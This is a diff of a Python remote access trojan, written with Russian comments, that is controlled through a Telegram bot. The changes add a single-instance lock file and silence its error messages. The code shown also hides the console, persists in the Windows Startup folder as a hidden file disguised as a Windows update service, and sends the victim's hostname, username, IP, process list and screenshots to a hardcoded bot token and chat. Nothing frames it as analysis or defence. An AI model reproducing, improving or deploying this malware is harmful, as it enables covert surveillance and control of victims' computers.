@@ -6,6 +6,7 @@ import time
 import shutil
 import socket
 import sys
+import threading
 
 try:
     from PIL import ImageGrab
@@ -20,13 +21,48 @@ except ImportError:
 BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
 CHAT_ID = "-1003442349627"
 
+# Глобальная блокировка чтобы предотвратить множественный запуск
+lock_file = "rat_running.lock"
+
 class RealRAT:
     def __init__(self):
         self.bot_token = BOT_TOKEN
         self.chat_id = CHAT_ID
         self.victim_id = socket.gethostname()
         self.last_update_id = 0
+        self.already_started = False
         
+    def is_already_running(self):
+        """Проверяем, не запущена ли уже RAT"""
+        try:
+            if os.path.exists(lock_file):
+                # Проверяем время создания файла
+                file_time = os.path.getctime(lock_file)
+                if time.time() - file_time < 300:  # 5 минут
+                    return True
+                else:
+                    # Старый файл - удаляем
+                    os.remove(lock_file)
+            return False
+        except:
+            return False
+            
+    def create_lock(self):
+        """Создаем файл-блокировку"""
+        try:
+            with open(lock_file, 'w') as f:
+                f.write(str(time.time()))
+        except:
+            pass
+            
+    def remove_lock(self):
+        """Удаляем файл-блокировку"""
+        try:
+            if os.path.exists(lock_file):
+                os.remove(lock_file)
+        except:
+            pass
+
     def hide_console(self):
         try:
             if platform.system().startswith("Windows"):
@@ -38,7 +74,7 @@ class RealRAT:
             pass
 
     def setup_persistence(self):
-        """Добавляем в автозагрузку и запускаем"""
+        """Добавляем в автозагрузку"""
         try:
             if platform.system().startswith("Windows"):
                 appdata = os.getenv('APPDATA')
@@ -51,13 +87,9 @@ class RealRAT:
                 if not os.path.exists(target_path):
                     shutil.copy2(script_path, target_path)
                     subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
-                
-                # ЗАПУСКАЕМ СЕБЯ ИЗ АВТОЗАГРУЗКИ
-                subprocess.Popen(['python', target_path], 
-                               creationflags=subprocess.CREATE_NO_WINDOW)
                     
         except Exception as e:
-            print(f"Ошибка автозагрузки: {e}")
+            pass
 
     def send_to_telegram(self, text):
         try:
@@ -94,7 +126,7 @@ class RealRAT:
             }
             params = {
                 'chat_id': self.chat_id,
-                'text': f'🎯 НОВАЯ ЖЕРТВА: {self.victim_id}\nВыберите действие:',
+                'text': f'🎯 Управление: {self.victim_id}\nВыберите действие:',
                 'reply_markup': keyboard
             }
             response = requests.post(url, json=params, timeout=10)
@@ -103,25 +135,22 @@ class RealRAT:
                 if 'result' in data:
                     self.last_update_id = data['result']['update_id']
         except Exception as e:
-            print(f"Ошибка клавиатуры: {e}")
+            pass
 
     def collect_system_info(self):
         try:
             ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
             
-            info = f"""💻 НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!
+            info = f"""💻 СИСТЕМА:
 
 🖥️ Компьютер: {self.victim_id}
 👤 Пользователь: {os.getlogin()}
-🌐 IP адрес: {ip}
-⚙️ Система: {platform.system()} {platform.release()}
-📁 Директория: {os.getcwd()}
-
-🚀 RAT активирована!"""
+🌐 IP: {ip}
+⚙️ ОС: {platform.system()} {platform.release()}"""
             
             return info
         except:
-            return f"🎯 НОВАЯ ЖЕРТВА!\nКомпьютер: {self.victim_id}\nПользователь: {os.getlogin()}"
+            return f"💻 Компьютер: {self.victim_id}\n👤 Пользователь: {os.getlogin()}"
 
     def take_screenshot(self):
         try:
@@ -167,11 +196,11 @@ class RealRAT:
                 
             elif command == '🌐 IP адрес':
                 ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
-                return f"🌐 IP адрес: {ip}"
+                return f"🌐 IP: {ip}"
                 
             elif command == '📊 Процессы':
                 processes = self.get_processes()
-                return f"📊 Запущенные процессы:\n{processes}"
+                return f"📊 Процессы:\n{processes}"
                 
             elif command == '🔄 Перезагрузить':
                 if platform.system().startswith("Windows"):
@@ -183,9 +212,10 @@ class RealRAT:
                     
             elif command == '🗑️ Удалить RAT':
                 if self.uninstall_rat():
-                    return "🗑️ RAT удалена из автозагрузки! Завершение работы..."
+                    self.remove_lock()
+                    return "🗑️ RAT удалена!"
                 else:
-                    return "❌ Ошибка удаления RAT"
+                    return "❌ Ошибка удаления"
                     
             else:
                 return "❌ Неизвестная команда"
@@ -194,7 +224,7 @@ class RealRAT:
             return f"❌ Ошибка: {str(e)}"
 
     def check_commands(self):
-        """Проверяем только НОВЫЕ команды от бота"""
+        """Проверяем команды от бота"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
             params = {'offset': self.last_update_id + 1, 'timeout': 10}
@@ -206,49 +236,60 @@ class RealRAT:
                     for update in data['result']:
                         update_id = update['update_id']
                         
-                        # Обновляем ID последнего сообщения
                         if update_id > self.last_update_id:
                             self.last_update_id = update_id
                         
-                        # Обрабатываем только если есть сообщение с текстом
                         if 'message' in update and 'text' in update['message']:
                             message_text = update['message']['text']
                             
-                            # Обрабатываем команды с кнопок
                             if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                               '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                 result = self.execute_command(message_text)
                                 self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                 
-                                # Если удаляем RAT - завершаем работу
                                 if message_text == '🗑️ Удалить RAT':
                                     time.sleep(2)
                                     sys.exit(0)
                             
         except Exception as e:
-            print(f"Ошибка проверки команд: {e}")
+            pass
 
-    def start(self):
-        # Скрываем консоль
-        self.hide_console()
+    def start_initialization(self):
+        """Инициализация - отправляем сообщение только один раз"""
+        if self.already_started:
+            return
+            
+        self.already_started = True
         
-        # Устанавливаем автозагрузку И ЗАПУСКАЕМСЯ
-        self.setup_persistence()
-        
-        # Ждем немного для стабильности
-        time.sleep(5)
-        
-        # Отправляем уведомление о подключении
+        # Отправляем информацию о системе
         system_info = self.collect_system_info()
         self.send_to_telegram(system_info)
         
         # Отправляем клавиатуру
-        time.sleep(2)
+        time.sleep(1)
         self.send_keyboard()
         
-        # Делаем первый скриншот
-        time.sleep(3)
+        # Делаем скриншот
+        time.sleep(2)
         self.take_screenshot()
+
+    def start(self):
+        # Проверяем, не запущена ли уже RAT
+        if self.is_already_running():
+            print("RAT уже запущена, завершаем...")
+            sys.exit(0)
+            
+        # Создаем блокировку
+        self.create_lock()
+        
+        # Скрываем консоль
+        self.hide_console()
+        
+        # Устанавливаем автозагрузку
+        self.setup_persistence()
+        
+        # Инициализация (только один раз)
+        self.start_initialization()
         
         print("RAT запущена и работает...")
         
@@ -258,20 +299,11 @@ class RealRAT:
                 self.check_commands()
                 time.sleep(3)
             except Exception as e:
-                print(f"Ошибка главного цикла: {e}")
                 time.sleep(10)
+                
+        # Удаляем блокировку при выходе
+        self.remove_lock()
 
 if __name__ == '__main__':
-    # Проверяем не запущены ли мы уже из автозагрузки
-    current_file = os.path.abspath(__file__)
-    startup_file = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update_service.py')
-    
-    # Если мы НЕ из автозагрузки - копируем и запускаем оттуда
-    if current_file != startup_file and os.path.exists(startup_file):
-        # Запускаем версию из автозагрузки
-        subprocess.Popen(['python', startup_file], creationflags=subprocess.CREATE_NO_WINDOW)
-        sys.exit(0)
-    else:
-        # Запускаем текущую версию
-        rat = RealRAT()
-        rat.start()
+    rat = RealRAT()
+    rat.start()
